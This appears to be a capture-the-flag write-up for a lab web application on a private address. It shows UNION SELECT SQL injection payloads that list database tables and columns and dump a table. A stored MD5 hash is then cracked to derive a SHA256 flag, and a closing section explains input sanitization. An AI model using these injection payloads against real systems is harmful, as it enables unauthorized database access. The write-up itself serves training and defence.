
http://10.12.100.231/?page=member

5 UNION SELECT table_name, column_name FROM information_schema.columns

First name: list_images

Surnames : title, url, comment

http://10.12.100.231/?page=searchimg

`5 UNION SELECT title, comment FROM list_images`

`ID: 5 UNION SELECT title, comment FROM list_images` 

Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?

[md5_decrypt](https://www.md5online.org/md5-decrypt.html) (1928e8083cf461a51303633093573c46) = albatroz

[Sha256](https://md5decrypt.net/en/Sha256/)(albatroz) = `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## # Prevention

Sanitizing inputs refers to the process of validating and cleaning user-provided data before using it in an application or storing it in a database. The purpose of input sanitization is to ensure the integrity, security, and stability of the application by preventing potentially harmful or unexpected data from causing issues.

When users interact with an application, they can input various types of data, such as text, numbers, files, or other forms of input. However, this data may not always be reliable, and malicious users may attempt to exploit vulnerabilities or disrupt the application's functionality.

Input sanitization involves validating and cleaning the input data to ensure it conforms to expected formats, types, and constraints. This process typically includes the following steps:

1. Validation: Checking the input data to ensure it meets specific criteria, such as length limits, required fields, allowed character sets, or numeric ranges. Validation helps ensure the input is valid and appropriate for the application's needs.
2. Filtering: Removing or neutralizing potentially harmful or unwanted elements from the input. This may involve removing special characters, HTML tags, or scripts that could be used for injection attacks or malicious code execution.
3. Encoding: Converting characters or symbols that have special meanings in the context of the application to their encoded representations. This prevents the interpreted execution of potentially dangerous characters or code.